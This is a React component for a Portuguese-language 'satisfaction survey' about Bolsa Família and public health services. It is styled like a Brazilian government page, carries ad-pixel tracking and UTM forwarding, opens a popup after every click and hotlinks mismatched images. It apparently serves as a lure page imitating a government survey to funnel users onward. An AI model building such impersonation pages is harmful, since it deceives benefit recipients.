import React, { useState } from "react";
import { ArrowLeft, ArrowRight, CheckCircle } from "lucide-react";
import Popup from "../components/Popup";
import useUtmNavigator from "../hooks/useUtmNavigator";
import { usePixelTracking } from '../hooks/usePixelTracking';

const Quiz: React.FC = () => {
	usePixelTracking();
	
	const navigate = useUtmNavigator();
	const [currentQuestion, setCurrentQuestion] = useState(0);
	const [answers, setAnswers] = useState<Record<number, number>>({});
	const [showPopup, setShowPopup] = useState(false);

	const questions = [
		{
			question: "O Programa Bolsa Família ajudou o Brasil a cumprir com a meta de redução da pobreza?",
			image: "https://imagens.ebc.com.br/h_OrYs5nNhcKNGcSd6LU1skUF94=/1170x700/smart/https://agenciabrasil.ebc.com.br/sites/default/files/thumbnails/image/2024/04/02/53628083405_9eff29bda1_o.jpg?itok=ntQizhGZ",
			imageAlt: "Atendimento em Saúde",
			options: ["Muito insatisfeito", "Insatisfeito", "Neutro", "Satisfeito", "Muito satisfeito"],
		},
		{
			question: "Com que frequência você utiliza os serviços de saúde pública?",
			image: "https://www.bicalhoadvocacia.com.br/wp-content/uploads/2025/02/auxilio-doenca.png",
			imageAlt: "Sistema Único de Saúde - SUS",
			options: ["Nunca", "Raramente", "Às vezes", "Frequentemente", "Muito frequentemente"],
		},
		{
			question: "Como você classifica o tempo de espera para atendimento médico?",
			image: "https://cotia.sp.gov.br/wp-content/uploads/2023/02/CARD-Seguro-Desemprego-G-1024x635.png",
			imageAlt: "Tempo de Espera - Atendimento Médico",
			options: ["Muito longo", "Longo", "Razoável", "Curto", "Muito curto"],
		},
	];

	const handleAnswer = (questionIndex: number, answerIndex: number) => {
		setAnswers((prev) => ({
			...prev,
			[questionIndex]: answerIndex,
		}));
		setShowPopup(true);
	};

	const isLastQuestion = currentQuestion === questions.length - 1;
	const hasAnsweredCurrent = answers[currentQuestion] !== undefined;

	const handleNavigation = (direction: "next" | "prev") => {
		if (direction === "next") {
			if (isLastQuestion) {
				navigate("/programa");
			} else {
				setCurrentQuestion((prev) => prev + 1);
			}
		} else {
			setCurrentQuestion((prev) => prev - 1);
		}
		setShowPopup(true);
	};

	return (
		<main className="container mx-auto px-4 py-6 flex-grow">
			<div className="max-w-xl md:max-w-3xl mx-auto">
				<div className="mb-6">
					<h1 className="text-[#1351B4] text-2xl md:text-3xl font-bold mb-2">Pesquisa de Satisfação</h1>
					<div className="h-1 w-24 bg-green-500"></div>
				</div>

				<div className="bg-white rounded-lg p-6 md:p-8 shadow-sm">
					<div className="mb-6">
						<div className="flex justify-between items-center mb-3">
							<span className="text-xs md:text-sm text-gray-500">
								Questão {currentQuestion + 1} de {questions.length}
							</span>
							<div className="flex gap-1">
								{questions.map((_, index) => (
									<div
										key={index}
										className={`h-2 w-8 rounded-full ${
											index === currentQuestion
												? "bg-[#1351B4]"
												: answers[index] !== undefined
												? "bg-green-500"
												: "bg-gray-200"
										}`}
									/>
								))}
							</div>
						</div>

						<div className="space-y-4 md:space-y-6">
							<div className="bg-gray-50 p-4 md:p-6 rounded-lg">
								<h2 className="text-lg md:text-xl font-semibold text-[#1351B4] mb-3">
									{questions[currentQuestion].question}
								</h2>

								<img
									src={questions[currentQuestion].image}
									alt={questions[currentQuestion].imageAlt}
									className="w-full rounded-lg max-h-48 md:max-h-64 object-cover"
								/>
							</div>

							<div className="space-y-3">
								{questions[currentQuestion].options.map((option, index) => (
									<button
										key={index}
										onClick={() => handleAnswer(currentQuestion, index)}
										className={`w-full p-3 md:p-4 rounded-lg border-2 text-left transition-colors ${
											answers[currentQuestion] === index
												? "border-[#1351B4] bg-blue-50"
												: "border-gray-200 hover:border-gray-300"
										}`}
									>
										<div className="flex items-center gap-2 md:gap-3">
											<div
												className={`w-4 h-4 md:w-5 md:h-5 rounded-full border-2 flex items-center justify-center ${
												answers[currentQuestion] === index
													? "border-[#1351B4] bg-[#1351B4]"
													: "border-gray-300"
												}`}
											>
												{answers[currentQuestion] === index && (
													<CheckCircle size={12} className="text-white" />
												)}
											</div>
											<span className="text-sm md:text-base">{option}</span>
										</div>
									</button>
								))}
							</div>
						</div>
					</div>

					<div className="flex justify-between mt-6">
						<button
							onClick={() => handleNavigation("prev")}
							disabled={currentQuestion === 0}
							className="flex items-center gap-2 px-4 py-2 md:px-6 md:py-3 rounded-lg text-[#1351B4] disabled:opacity-50 disabled:cursor-not-allowed"
						>
							<ArrowLeft size={18} />
							<span>Anterior</span>
						</button>

						<button
							onClick={() => handleNavigation("next")}
							disabled={!hasAnsweredCurrent}
							className="flex items-center gap-2 px-4 py-2 md:px-6 md:py-3 rounded-lg bg-[#1351B4] text-white disabled:opacity-50 disabled:cursor-not-allowed"
						>
							<span>{isLastQuestion ? "Finalizar" : "Próxima"}</span>
							<ArrowRight size={18} />
						</button>
					</div>
				</div>
			</div>

			<Popup isOpen={showPopup} onClose={() => setShowPopup(false)} />
		</main>
	);
};

export default Quiz;